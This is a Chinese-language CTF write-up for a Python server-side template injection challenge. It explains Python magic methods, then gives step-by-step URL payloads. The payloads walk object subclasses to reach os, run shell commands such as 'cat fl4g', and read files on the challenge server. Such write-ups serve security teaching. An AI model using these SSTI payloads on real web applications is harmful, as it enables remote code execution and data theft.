## 攻防世界-Web_python_template_injection

python中编写的主流web框架有Django、Tornado、Flask、Twisted。

SSTI （Server-Side Template Injection）服务器端模板注入

### 魔术方法

__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用

### 注入方法

1. 输入http://111.200.241.244:52224/{{config}}，发现类似于SQLI中的报错注入，还会显示not found，会显示config的信息 。
    
2. [http://159.138.137.79:56645/](http://159.138.137.79:56645/){{''._______****class****}}得到<type 'str'>，字符串类型嘛。
    
3. [http://159.138.137.79:56645/](http://159.138.137.79:56645/){{''.**class**.**mro**}} <type 'str'>, <type 'basestring'>, <type 'object'>，意思就是‘’继承于str，str继承于basestring，basestring又继承于object
    
4. [http://159.138.137.79:56645/](http://159.138.137.79:56645/){{''.**class**.**mro**[2].**subclasses**()}}得到所有直接（不确定，自己看看，应该是直接）继承object的类
    
5. 联系题目，明显的是后端有一个flag文件需要open，然后print出来，或者使用命令行cat 查看。先去找这个文件，应该在根目录。
    
6. 找到Site_Printer() 位于第72位:所以:**subclasses**()[71]
    
7. [http://159.138.137.79:56645/](http://159.138.137.79:56645/){{''.**class**.**mro**[2].**subclasses**()[71].**init**.**globals**['os'].listdir('./')}}，输出所有当前目录文件名或者''.**class**.**mro**[2].**subclasses**()[71].**init**.**globals**['os'].popen('ls').read()也可
    
    http://159.138.137.79:56645/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('./')}}
    http://159.138.137.79:56645/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}} #执行命令，可用cat
    
    [![image-20210802111910803](https://img2020.cnblogs.com/blog/2348945/202108/2348945-20210802111911763-1839529614.png)](https://img2020.cnblogs.com/blog/2348945/202108/2348945-20210802111911763-1839529614.png)
    
8. 两种读取方式
    
    40对应的是<type 'file'>
    
    http://159.138.137.79:56645/{{''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()}}
    http://159.138.137.79:56645/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}} 
    

参考：[天成的信息安全小站 (cnblogs.com)](https://www.cnblogs.com/SonnyYeung/p/12702179.html)